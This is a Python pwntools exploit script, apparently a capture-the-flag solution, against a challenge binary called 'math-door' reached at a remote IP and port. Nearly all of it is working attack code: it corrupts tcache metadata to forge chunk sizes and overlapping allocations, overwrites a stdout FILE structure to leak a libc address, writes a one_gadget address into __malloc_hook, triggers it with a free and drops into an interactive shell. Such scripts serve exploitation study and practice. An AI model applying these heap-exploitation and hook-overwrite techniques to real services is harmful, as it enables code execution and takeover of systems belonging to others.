#!/usr/bin/python2

from pwn import *

#exe = ELF("math-door_patched") #system library, so I can use heapinfo commands in gdb
exe = ELF("math-door") #challenge libc
libc = ELF("libc.so.6")
ld = ELF("ld.so")

context.binary = exe

ru = lambda r,a : r.recvuntil("{}".format(a))
rl = lambda r : r.recvline()
re = lambda r,a : r.recv("{}".format(a))
sl = lambda r,a : r.sendline("{}".format(a))
se = lambda r,a : r.sendline("{}".format(a))
sla = lambda r,a,b : r.sendlineafter("{}".format(a),"{}".format(b))
g = lambda r: gdb.attach(r, gdbscript="""
                         b *create
                         b *read_int
                         vmmap""")
gs = lambda r,a : gdb.attach(r, gdbscript = a)

index = -1
one_gadget = 0xe3b01
pop_r12 = 0x000000000002f709
pop_r122 = 0x000000000012cf7d# : pop r12 ; pop rbp ; ret
pop_rbp = 0x00000000000226c0# : pop rbp ; ret
pop_rsp = 0x000000000002f70a# : pop rsp ; ret

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("64.227.41.83",32316)

    return r

def alloc_glyph(r):
    global index
    sla(r,"Action:","1")
    index += 1
    return index

def delete_glyph(r, index):
    sla(r,"Action:","2")
    sla(r,"index:",index)
    return
    
def add_glyph(r, index, payload):
    sla(r,"Action:","3")
    sla(r,":", index)
    sla(r,":", payload)

def fill_tcache(r):
    for i in range(8):
        alloc_glyph(r)
    for i in range(8):
        delete_glyph(r,i)

def vuln(r, idx1, idx2, offset, payload):
    delete_glyph(r,idx1)
    delete_glyph(r,idx2)
    subtraction = p64(offset, sign='signed')
    subtraction += p64(0)
    add_glyph(r, idx2, subtraction)
    alloc_glyph(r)
    misalligned_chunk = alloc_glyph(r)
    add_glyph(r, misalligned_chunk, payload)

def main():
    r = conn()

    #setup
    alloc_glyph(r)
    target = alloc_glyph(r)
    alloc_glyph(r)
    alloc_glyph(r)
    setup = alloc_glyph(r)
    indexs = []
    for i in range(40):
        print i
        indexs.append(alloc_glyph(r))
    #delete_glyph(r,0)
    target = 7
    setup = 10
    delete_glyph(r,7)
    delete_glyph(r,10)
    subtraction = p64(-0xf0, sign='signed')
    subtraction += p64(0)
    add_glyph(r,setup,subtraction)

    alloc_glyph(r)  ## pop bad address into the allocator feild

    log.info("setting up fake chunk")

    misalligned_chunk = alloc_glyph(r)  ##allocate to before an in use chunk, to mess with the size feild
    add_glyph(r,misalligned_chunk,p64(0)+p64(0x441)+p64(0)) #change the size feild

    #delete_glyph(r,6)
    #delete_glyph(r,9)
    #subtraction = p64(-0xb0, sign='signed')
    #subtraction += p64(0)
    #add_glyph(r, 9, subtraction)
    #alloc_glyph(r)
    #misalligned_chunk2 = alloc_glyph(r)
    #add_glyph(r, misalligned_chunk2, p64(0)*3)

    #vuln(r, 6, 9, -0xb0, p64(0)*3) 
    #vuln(r, 5, 8, -0x70, p64(0)*3)

    #delete_glyph(r, 34)
    #delete_glyph(r, 37)
    #subtraction = p64(-0x30, sign='signed')
    #subtraction += p64(0)
    #add_glyph(r, 37, subtraction)
    #alloc_glyph(r)
    #misalligned_chunk3 = alloc_glyph(r)
    #add_glyph(r, misalligned_chunk3, p64(0)*3)
   
    #vuln(r, 34, 37, -0x30, p64(0))

    #add_glyph(r, 33, p64(0)+p64(0x21)+p64(0))
    #new = alloc_glyph(r)
    #add_glyph(r, 1, p64(0)*3)
    vuln(r, 20, 23, -0x510, p64(3)+p64(0)*2)
    
    delete_glyph(r,0)  #free target chunk   
    add_glyph(r,misalligned_chunk, p64(0)+p64(-0x420, sign='signed')+p64(0))
    add_glyph(r, 0, p64(0xAB8, sign='signed') + p64(0)*2) ## edit the libc offset to point to __malloc_hook
   
    #get the pointer in the right spot
    delete_glyph(r,2)
    delete_glyph(r,3)
    add_glyph(r, 3, p64(-0x40, sign='signed'))
    alloc_glyph(r)
    alloc_glyph(r)

    log.info("Initial setup complete")

    malloc_hook_idx = alloc_glyph(r)

    #number2 = alloc_glyph(r)

    add_glyph(r, 0, p64(0x18) + p64(0)*2)
    

    delete_glyph(r,4)
    delete_glyph(r,5)
    add_glyph(r, 5, p64(-0x80, sign='signed'))
    alloc_glyph(r)
    alloc_glyph(r)

    chain = alloc_glyph(r)

    add_glyph(r, 0, p64(0x1798, sign='signed')+p64(0)*2)
    #pwn it
    add_glyph(r, malloc_hook_idx, p64(0) + p64(0xfbad0800) + p64(0)) 
    #add_glyph(r, chain, p64(0x88)*3)
    log.info("attempting to leak libc base")
    sla(r, "Action", "3")
    sla(r, "index:", chain)
    sla(r, "glyph:", p64(0)*2+p64(-0x23+0x8, sign='signed'))
    #print chain
    #r.interactive()
    #chef = ru(r, "glyph:")
    #print chef
    #print rl(r)
    libc_leak = re(r,6) + "\x00\x00"
    libc_leak = u64(libc_leak)
    log.info("LEAK: {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x1CA980 - 0x22000
    log.info("LIBC_BASE: {}".format(hex(libc_base)))
    
    
    delete_glyph(r,6)
    delete_glyph(r,8)
    add_glyph(r, 8, p64(-0xc0, sign='signed'))
    alloc_glyph(r)
    alloc_glyph(r)

    malloc_hook_idx = alloc_glyph(r)
    #delete_glyph(r, 37)
    #alloc_glyph(r)
    add_glyph(r, malloc_hook_idx, p64(libc_base+one_gadget))#+p64(libc_base + pop_r12)+p64(libc_base + one_gadget))#p64(libc_base+pop_r12)+p64(0)+p64(libc_base + one_gadget))

    #add_glyph(r, 22, p64(0)*3)
    #delete_glyph(r, 29)
    #delete_glyph(r, 30)

    #g(r)

    delete_glyph(r,0)

    #add_glyph(r, malloc_hook_idx, p64(libc_base+one_gadget))#p64(libc_base+pop_r12)+p64(0)+p64(libc_base + one_gadget))
    #delete_glyph(r, after_malloc_hook)
    #delete_glyph(r, after_malloc_hook)

    #trigger
    #alloc_glyph(r)

    r.interactive()


if __name__ == "__main__":
    main()
